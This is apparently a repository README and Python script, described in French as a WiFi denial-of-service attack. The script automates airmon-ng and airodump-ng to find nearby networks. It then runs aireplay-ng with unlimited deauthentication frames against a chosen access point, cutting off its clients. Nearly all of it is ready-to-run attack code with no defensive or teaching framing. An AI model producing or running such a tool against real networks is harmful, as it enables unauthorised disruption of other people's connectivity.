# dos
Attaque DoS (déni de service) WiFi Python
#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

def display_banner():
    print(r"""ADEM""")
    print("\n****************************************************************")
    print("* Refactored Version for Structure Change Only                *")
    print("****************************************************************")

def ensure_sudo():
    if 'SUDO_UID' not in os.environ:
        print("Error: Please run this program with sudo.")
        exit()

def clean_csv_files():
    backup_dir = os.path.join(os.getcwd(), "backup")
    os.makedirs(backup_dir, exist_ok=True)
    for file in os.listdir():
        if file.endswith(".csv"):
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            print(f"Moving existing CSV: {file} -> backup/{timestamp}-{file}")
            shutil.move(file, os.path.join(backup_dir, f"{timestamp}-{file}"))

def get_wifi_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True).stdout.decode()
    return re.findall(r"^wlan[0-9]+", result, re.MULTILINE)

def select_interface(interfaces):
    print("Available wireless interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i}: {iface}")
    while True:
        try:
            selection = int(input("Select interface: "))
            return interfaces[selection]
        except (ValueError, IndexError):
            print("Invalid selection. Try again.")

def kill_conflicting_procs():
    print("Killing conflicting processes...")
    subprocess.run(["airmon-ng", "check", "kill"])

def enable_monitor_mode(interface):
    print(f"Enabling monitor mode on {interface}...")
    subprocess.run(["airmon-ng", "start", interface])

def scan_networks(interface):
    print("Starting airodump-ng scan...")
    return subprocess.Popen(["airodump-ng", "-w", "scan_output", "--write-interval", "1", "--output-format", "csv", interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def parse_networks():
    networks = []
    seen_essids = set()
    for file in os.listdir():
        if file.endswith(".csv"):
            with open(file) as f:
                reader = csv.DictReader(f, fieldnames=[
                    'BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                    'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key'
                ])
                for row in reader:
                    bssid = row.get("BSSID")
                    essid = row.get("ESSID")
                    if bssid in ["BSSID", "Station MAC"] or not essid or essid in seen_essids:
                        continue
                    networks.append(row)
                    seen_essids.add(essid)
    return networks

def display_networks(networks):
    print("\nScanning... Press Ctrl+C to stop and choose a target.\n")
    print("ID\tBSSID\t\t\tChannel\tESSID")
    print("--\t-------------------\t-------\t------------------------")
    for i, net in enumerate(networks):
        print(f"{i}\t{net['BSSID']}\t{net['channel'].strip()}\t{net['ESSID']}")

def choose_network(networks):
    while True:
        try:
            choice = int(input("Select target network: "))
            return networks[choice]
        except (ValueError, IndexError):
            print("Invalid choice. Try again.")

def set_target_channel(interface, channel):
    subprocess.run(["airmon-ng", "start", interface, channel])

def start_deauth_attack(target_bssid, interface):
    print(f"Starting deauth attack on {target_bssid} via {interface}")
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_bssid, interface])

def main():
    display_banner()
    ensure_sudo()
    clean_csv_files()

    interfaces = get_wifi_interfaces()
    if not interfaces:
        print("No wireless interfaces found.")
        exit()

    selected_iface = select_interface(interfaces)
    kill_conflicting_procs()
    enable_monitor_mode(selected_iface)

    monitor_iface = selected_iface + "mon"
    scan_process = scan_networks(monitor_iface)

    networks_found = []
    try:
        while True:
            subprocess.call("clear", shell=True)
            networks_found = parse_networks()
            display_networks(networks_found)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nScan stopped. Proceeding to selection...")

    target = choose_network(networks_found)
    bssid = target["BSSID"]
    channel = target["channel"].strip()

    set_target_channel(monitor_iface, channel)
    start_deauth_attack(bssid, monitor_iface)

if __name__ == "__main__":
    main()
